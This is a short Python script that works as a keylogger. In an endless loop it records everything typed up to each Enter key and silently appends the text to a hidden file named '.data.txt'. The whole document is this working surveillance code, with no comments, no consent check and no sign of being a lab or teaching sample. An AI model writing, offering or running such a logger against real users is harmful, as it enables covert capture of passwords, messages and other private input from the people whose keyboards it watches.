import keyboard

path = ".data.txt"
while True:
    events = keyboard.record('enter')
    texto = list(keyboard.get_typed_strings(events))
    if texto:
        with open(path, 'a') as f:
            f.write(texto[0] + '\n')